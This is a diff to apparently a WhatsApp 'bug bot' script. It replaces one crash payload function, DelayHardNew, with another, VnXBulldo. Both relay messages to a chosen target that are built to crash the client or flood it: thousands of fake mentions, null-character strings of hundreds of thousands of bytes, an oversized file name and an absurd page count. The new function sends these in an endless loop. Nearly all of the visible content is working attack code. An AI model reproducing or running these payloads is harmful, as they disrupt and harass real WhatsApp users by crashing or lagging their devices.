@@ -3519,9 +3519,9 @@ Status      : Success
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 100; i++) {
+            for (let i = 0; i < 1; i++) {
                 try {
-                    await DelayHardNew(sock, target);
+                    await VnXBulldo(sock, target);
                     await sleep(1500)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -4181,99 +4181,54 @@ async function VnXNewOneButtonsBlnk(sock, target) {
   });
 }
 
-async function DelayHardNew(sock, target) {
-  const SqlMeta = Array.from({ length: 10000 }, (_, VnX) =>
-    `${VnX}13135550001@s.whatsapp.net`
-  );
-
-  for (let z = 0; z < 150; z++) { 
-    const header = {
-      videoMessage: {
-        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_977428425010793_478212189942291937_n.enc?ccb=11-4&oh=01_Q5Aa4gHmH7vVbrVUvlhCySQuLF9lnjIVK1hidoRgxETJrlJVlA&oe=6A22A5A5&_nc_sid=5e03e0&mms3=true",
-        directPath: "/v/t62.7161-24/10000000_977428425010793_478212189942291937_n.enc?ccb=11-4&oh=01_Q5Aa4gHmH7vVbrVUvlhCySQuLF9lnjIVK1hidoRgxETJrlJVlA&oe=6A22A5A5&_nc_sid=5e03e0",
-        mimetype: "video/mp4",
-        caption: "VnX",
-        mediaKey: "wv/atWfl21qU9enzJBV5pfE2OU1/ouIFO5QuRQp5Heg=",
-        fileEncSha256: "P0Mc91Qhpus26uHe9iGnIfCBqOTPoaPpg3mInV2NVKk=",
-        fileSha256: "yYiWMdXM82iuxVc/vTKzQ7jZMc/jgtTe+KmwGYt4hpc=",
-        fileLength: "87906632",
-        mediaKeyTimestamp: "1778075081",
-        contextInfo: {},
-        streamingSidecar: "xey0UW72AH+ShCjYXVzOom/k+kt7VJryEZ+yNyAarqVJHx8L4j6sB4Da5ZGHXTfzX9g=",
-        thumbnailDirectPath: "/v/t62.36147-24/19977827_1442378506945978_3754389976888828856_n.enc?ccb=11-4&oh=01_Q5Aa1wGz9o9ukGbtWxoetr_ygoJDy0SN80KaAwJ1vywXvbTH8A&oe=687247F9&_nc_sid=5e03e0",
-        thumbnailSha256: "hxKrzb6DDC8qTu2xOdeZN4FBgHu8cmNekZ+pPye6dO0=",
-        thumbnailEncSha256: "Es1ZWpjDKRZ82XpiLARj3FZWh9DeFCEUG2wU8WHWrRs=",
-        annotations: [{
-          embeddedContent: {
-            embeddedMusic: {
-              musicContentMediaId: "1942620729844671",
-              songId: "432395962368430",
-              author: "VnX ⵢ Raffi",
-              title: "VnX",
-              artworkDirectPath: "/v/t62.76458-24/11810390_1884385592310849_8570381233425191298_n.enc?ccb=11-4&oh=01_Q5Aa1wFo3eosJQYj_I0wJby373H-MKodRwdx1sCOEt426yyLCg&oe=687233BB&_nc_sid=5e03e0",
-              artworkSha256: "8x8ENCxJyIrSFnF9ZHtiim423uGgPleSm8zPEbQZByE=",
-              artworkEncSha256: "HlsJKALVejvghjYZIrY46zosCX568b1cG9SzzZfCPNA=",
-              artistAttribution: "",
-              countryBlocklist: "",
-              isExplicit: false,
-              artworkMediaKey: "0DsOnYZAyNwPJgs5PZwL/EtFxBXO2cW9zwLYZGcAkvU="
-            }
-          },
-          embeddedAction: true
-        }]
-      },
-      hasMediaAttachment: true,
-    };
-
-    const msg = await generateWAMessageFromContent(target, {
-      viewOnceMessage: {
-        message: {
-          messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 2
-          },
+async function VnXBulldo(sock, target) {
+ while (true) {
+  const MsgNew = {
+    groupStatusMessageV2: {
+      message: {
+        documentMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7119-24/701194605_979944131092122_1860918218284985201_n.enc?ccb=11-4&oh=01_Q5Aa4gE59mooNBmYLPOKcNT25wDzfB1ctLP8qfS5BxyUygCgbQ&oe=6A2E2184&_nc_sid=5e03e0&mms3=true",
+          directPath: "/v/t62.7119-24/701194605_979944131092122_1860918218284985201_n.enc?ccb=11-4&oh=01_Q5Aa4gE59mooNBmYLPOKcNT25wDzfB1ctLP8qfS5BxyUygCgbQ&oe=6A2E2184&_nc_sid=5e03e0",
+          mediaKey: Buffer.from("89lwViNcegystiWyPMjQd8MyzphI1OrGEKMqjbOJJGQ=", "base64"),
+          fileEncSha256: Buffer.from("QH0ZymePSShq4wyl3u8FqVOQiXKAUaubDdhDSbQpy8Q=", "base64"),
+          fileSha256: Buffer.from("5bhEzFf1cJTqRYXiNfNseMHNIiJiu4nVPJTctNaz5V0=", "base64"),
+          mimetype: "application/msword",
+          fileLength: "10485760",
+          mediaKeyTimestamp: "1778818915",
+          fileName: "꦳".repeat(12000),
+          title: "\u0000".repeat(900000),
+          pageCount: 999999999,
+          contactVcard: false,
+          thumbnailDirectPath: "/v/t62.7119-24/701194605_979944131092122_1860918218284985201_n.enc?ccb=11-4&oh=01_Q5Aa4gE59mooNBmYLPOKcNT25wDzfB1ctLP8qfS5BxyUygCgbQ&oe=6A2E2184&_nc_sid=5e03e0",
+          thumbnailSha256: Buffer.from("5bhEzFf1cJTqRYXiNfNseMHNIiJiu4nVPJTctNaz5V0=", "base64"),
+          thumbnailEncSha256: Buffer.from("QH0ZymePSShq4wyl3u8FqVOQiXKAUaubDdhDSbQpy8Q=", "base64"),
+          thumbnailHeight: 100,
+          thumbnailWidth: 100,
+          caption: "",
+          accessibilityLabel: "",
+          mediaKeyDomain: 1,
           contextInfo: {
-            mentionedJid: SqlMeta + header,
-            participant: "0@s.whatsapp.net",
-            isGroupMention: true,
-            quotedMessage: {
-              viewOnceMessage: {
-                message: {
-                  interactiveResponseMessage: {
-                    body: {
-                      text: "VnX",
-                      format: "DEFAULT"
-                    },
-                    nativeFlowResponseMessage: {
-                      name: "galaxy_message",
-                      paramsJson: JSON.stringify({
-                        flow_cta: {
-                          title: "\u0000".repeat(250000)
-                        }
-                      }),
-                      version: 3
-                    }
-                  }
-                }
-              }
+            urlTrackingMap: {
+              urlTrackingMapElements: Array.from({ length: 1 }, () => ({}))
             },
-            remoteJid: "status@broadcast"
+            participants: Array.from({ length: 1 }, (_, n) => ({
+              participant: `62${n + 829599}@s.whatsapp.net`
+            }))
           }
         }
       }
-    }, {
-      userJid: sock.user.id,
-      quoted: null
-    });
+    }
+  };
 
-    await sock.relayMessage(target, msg.message, {
-      participant: {
-        jid: target
-      },
-      messageId: msg.key.id
-    });
+  try {
+    await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
+    console.log(`message success to ${target}`);
+  } catch (e) {
+    console.log("[!] Error Strike:", e);
   }
 }
+}
+
 
 //     _       ___  _   _ _   _ _____  _   _        
 //    | |     / _ \| | | | \ | /  __ \| | | |       
